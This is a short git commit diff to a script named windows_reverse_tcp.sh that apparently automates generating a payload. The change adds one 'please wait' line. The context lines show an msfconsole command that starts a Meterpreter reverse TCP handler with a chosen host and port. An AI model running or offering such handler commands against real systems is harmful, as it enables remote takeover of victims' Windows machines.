0886e6d764574b8b1a8c386a3b0e02484c1135de
gnsrikanth <nagasrikanthgrandhi@gmail.com>
2017-02-06 12:24:43 +0000

    Update windows_reverse_tcp.sh

--- payloads/windows_reverse_tcp.sh
+++ payloads/windows_reverse_tcp.sh
@@ -13,6 +13,7 @@ cd ..
 #TO START THE HANDLER
 echo "Do you want to start listner now?(1 for Yes/ 2 for No)"
 read op
+echo "please wait"
 case $op in 
 	1)
 	msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; run" ;; 
